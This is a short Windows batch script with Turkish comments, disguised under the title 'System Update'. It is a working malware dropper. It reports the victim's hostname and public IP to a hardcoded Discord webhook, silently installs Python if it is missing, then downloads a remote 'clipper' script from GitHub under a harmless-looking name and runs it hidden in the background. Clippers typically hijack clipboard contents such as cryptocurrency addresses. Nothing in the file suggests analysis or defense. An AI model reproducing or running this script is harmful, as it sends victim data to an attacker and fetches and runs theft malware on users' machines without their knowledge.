@echo off
title System Update
chcp 65001 >nul

:: Discord webhook (Base64 çözülmüş)
set "WEBHOOK=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0"

:: Bilgisayar adını al
for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"

:: Discord'a bildirim gönder (Düzeltilmiş PowerShell komutu)
powershell -Command "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('Content-Type','application/json'); $body='{\"content\": \"**✅ Yeni bağlantı!** Bilgisayar: %HOST% | IP: '+(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content+' | Zaman: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')+'\"}'; $wc.UploadString('%WEBHOOK%', $body)" >nul 2>&1

:: Python kontrol et
python --version >nul 2>&1
if errorlevel 1 (
    echo Python yok, kuruluyor...
    curl -L -o "%TEMP%\python_installer.exe" https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe
    start /wait "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1
    timeout /t 10 /nobreak >nul
)

:: Clipper scriptini indir
set "CLIPPER_URL=https://raw.githubusercontent.com/bilgi213h/hululu/main/clipper.py"
curl -L -o "%TEMP%\system_helper.pyw" "%CLIPPER_URL%"

:: Arka planda çalıştır
start pythonw "%TEMP%\system_helper.pyw"

exit
